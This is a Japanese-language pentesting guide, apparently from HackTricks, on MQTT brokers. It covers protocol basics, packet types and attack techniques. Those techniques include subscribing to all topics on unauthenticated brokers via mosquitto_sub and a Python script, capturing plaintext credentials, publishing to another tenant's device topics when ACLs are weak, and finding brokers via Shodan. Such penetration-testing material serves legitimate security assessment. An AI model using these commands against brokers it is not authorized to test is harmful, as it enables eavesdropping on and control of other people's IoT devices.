# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## 基本情報

**MQ Telemetry Transport (MQTT)** は、その極めてシンプルで軽量な点で知られる **publish/subscribe messaging protocol** です。このプロトコルは、性能が限られ、低帯域、高遅延、あるいは接続が不安定なネットワーク上で動作するデバイス環境に特化して設計されています。MQTT の主な目的はネットワーク帯域の使用を最小限に抑え、デバイス資源への負担を軽減することです。加えて、信頼性のある通信を維持し、一定の配信保証を提供することも目指しています。これらの特性により、MQTT は多数のデバイスを効率的に接続することが求められる **machine-to-machine (M2M) communication** や **Internet of Things (IoT)** の分野に非常に適しています。さらに、帯域とバッテリーの節約が重要なモバイルアプリケーションにも有益です。

**デフォルトポート:** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## トラフィックの検査

MQTTブローカーが**CONNECT**パケットを受信すると、**CONNACK**パケットが返信されます。このパケットには接続状態を理解するために重要なリターンコードが含まれています。リターンコードが**0x00**の場合は認証情報が受け入れられ、接続が成功したことを示します。一方、**0x05**は認証情報が無効であることを示し、接続が拒否されます。

例えば、ブローカーが認証情報の無効を理由に接続を拒否する場合、シナリオは以下のようになります：
```
{
"returnCode": "0x05",
"description": "Connection Refused, not authorized"
}
```
![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

Authentication は完全に任意で、たとえ authentication が行われていても、encryption はデフォルトで使用されません（credentials は平文で送信されます）。MITM 攻撃によりパスワードを窃取することも可能です。

MQTT サービスに接続するには次を使用できます: [https://github.com/bapowell/python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell) および、以下のようにして全トピックを購読します:
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
次のものも使用できます: [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn)

他にも使用できます:
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```
または、**このコードを実行して、認証なしで MQTT サービスに接続し、すべてのトピックを購読してメッセージを受信してみることもできます**:
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
client.subscribe('#', qos=1)
client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
#time.sleep(10)
#client.loop_stop()

if __name__ == "__main__":
main()
```
### パブリッシュ/サブスクライブモデル <a href="#b667" id="b667"></a>

パブリッシュ/サブスクライブモデルは以下で構成されます:

- **Publisher**: ブローカーの1つ（または複数）のトピックにメッセージを公開します。
- **Subscriber**: ブローカーの1つ（または複数）のトピックを購読し、Publisherから送られるすべてのメッセージを受信します。
- **Broker**: PublisherからSubscriberへすべてのメッセージをルーティングします。
- **Topic**: スラッシュで区切られた1つ以上のレベルで構成されます（例: /smartshouse/livingroom/temperature）。

### パケット形式 <a href="#f15a" id="f15a"></a>

すべての MQTT パケットは固定ヘッダを含みます（Figure 02）。Figure 02: Fixed Header

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### パケットタイプ

- CONNECT (1): クライアントがサーバへの接続を要求するために送信します。
- CONNACK (2): サーバによる接続成功の応答です。
- PUBLISH (3): クライアントからサーバ、またはその逆方向にメッセージを送信するために使用されます。
- PUBACK (4): PUBLISH パケットの受領確認です。
- PUBREC (5): メッセージ配信が受信されたことを保証するプロトコルの一部です。
- PUBREL (6): メッセージ配信の追加保証として、メッセージの解放を示します。
- PUBCOMP (7): 配信プロトコルの最終段階で、完了を示します。
- SUBSCRIBE (8): クライアントがトピックのメッセージを受信するようリクエストするためのパケットです。
- SUBACK (9): SUBSCRIBE リクエストに対するサーバの応答です。
- UNSUBSCRIBE (10): クライアントがトピックの受信を停止するよう要求するためのパケットです。
- UNSUBACK (11): UNSUBSCRIBE リクエストに対するサーバの応答です。
- PINGREQ (12): クライアントが送るハートビートメッセージです。
- PINGRESP (13): ハートビートメッセージに対するサーバの応答です。
- DISCONNECT (14): クライアントが接続を終了するために送信します。
- 値 0 と 15 は予約されており、使用は禁じられています。

## IoT MQTT エコシステムの攻撃: plaintext brokers と topic ACL バイパス

多くのコンシューマ向け IoT プラットフォームは、次の2つの役割で使用される MQTT ブローカーを公開しています:
- 無線プロトコル（例: BLE/LoRa/Zigbee）をクラウドにブリッジする Gateway/hub デバイス。
- “app” トピック経由でデバイスを制御する Mobile apps や web backends。

pentest 中に悪用できる一般的な弱点:

- 非標準ポート（例: TCP/8001）での平文 MQTT（MQTTS ではない）。オンパスの観測者は認証情報や制御フレームを読み取ることができます。Wireshark を使って、非標準ポート上の平文の CONNECT/CONNACK や SUBSCRIBE/PUBLISH トラフィックを検出してください。
- テナントごとのトピック ACL が弱い、または存在しない場合。トピック名が deviceId のみで名前空間化されている（例: "/tenantless/<deviceId>/tx"）と、認証済みユーザが他テナントのデバイスに対して PUBLISH できてしまう可能性があります。
- メンテナンス／管理用トピックを介した機密データの露出（例: 設定変更後に Wi‑Fi 認証情報が平文でブロードキャストされる）。

例（プレースホルダは実際の値に置き換えてください）:

Subscribe to potentially sensitive topics with known topic prefixes and device IDs:
```bash
# Using mosquitto_sub
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
ACLsが弱い場合のテナント間制御（別テナントのデバイストピックへ publish）:
```bash
mosquitto_pub -h <app-broker> -p <port> -V mqttv311 \
-i <your_client_id> -u <your_username> -P <your_password> \
-t "/ys/<victimDeviceId>/tx" \
-m '{"method":"Device.setState","params":{"state":{"power":"on"}},"targetDevice":"<victimDeviceId>"}'
```
## Shodan

- `port:1883 MQTT`
- 非標準ポートでのMQTTの平文通信はIoTでは一般的です。別のポートでブローカーを検索し、プロトコル検出で確認することを検討してください。

## 参考資料

- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

{{#include ../banners/hacktricks-training.md}}
